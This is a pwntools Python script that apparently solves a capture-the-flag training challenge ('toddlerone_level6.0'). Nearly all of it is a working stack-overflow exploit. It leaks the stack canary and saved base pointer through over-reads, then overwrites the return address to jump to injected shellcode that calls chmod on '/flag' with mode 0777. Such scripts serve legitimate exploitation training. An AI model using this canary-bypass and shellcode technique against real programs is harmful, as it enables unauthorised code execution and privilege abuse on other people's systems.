from pwn import *

p = process("/challenge/toddlerone_level6.0")

"""
rsp = int(input("Rsp = "))
rbp = int(input("RBP = "))
ret = rbp+0x8
canary = rbp-int(input("offset = "))
"""

rsp = 0x00007fff88a73530
rbp = 0x00007fff88a735f0
ret = 0x00007fff88a735f8
canary = 0x00007fff88a735d8
in_addr = 0x7fff88a73580


before_ret = ret - in_addr
before_canary = (canary - in_addr)
print("before canary : ", before_canary)
print("before ret : ", before_ret)
p.readuntil(b'Payload size: ')
canary_payload = b'89 REPEATaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawxyz'
print("canary payload = ", canary_payload)
print("canary payload length = ", len(canary_payload))
p.send(canary_payload)
p.readuntil(b'wxyz')
print("here")
x = p.readuntil(b'This challenge has a trick hidden')
Canary = b'\x00' + x[:7]
xcanary = b'A' + x[:7]
print("canary = ", Canary)
p.readuntil(b'Payload size: ')


p.send(b'10 REPEATaaaa')
p.readuntil(b'Payload size: ')

prev_rbp_payload = b'112 REPEAT' + b'z'*105 + b'x'

print("Previous rbp payload = ", prev_rbp_payload)
print("previous rbp payload length = ", len(prev_rbp_payload))
p.send(prev_rbp_payload)
p.readuntil(b'zx')
x = p.readuntil(b'\n')
x = x[:6]

prev_rbp = int.from_bytes(x, 'little')
print("Previous rbp = ", hex(prev_rbp))
print(x)


p.readuntil(b'Payload size: ')
ret_addr = prev_rbp-0x190
ret = ret_addr.to_bytes(8, 'little')
print("Return address = ", hex(ret_addr))


context.arch = 'amd64'
assem = """
	mov rax, 90
    lea rdi, [rip + file]
    mov rsi, 0x1ff
	syscall
file:
	.string "/flag"
"""
shellcode = asm(assem)
print("shellcode length = ", len(shellcode))

final_payload = b'173 ' + b'a'*76 + b'Z\x00\x00\x00\x01\x00\x00\x00aaaa' + \
    Canary + b'a'*0x18 + ret + shellcode
print("payload length = ", len(final_payload))
p.send(final_payload)
# p.readuntil(b'Goodbye!\n')
print(p.readall())
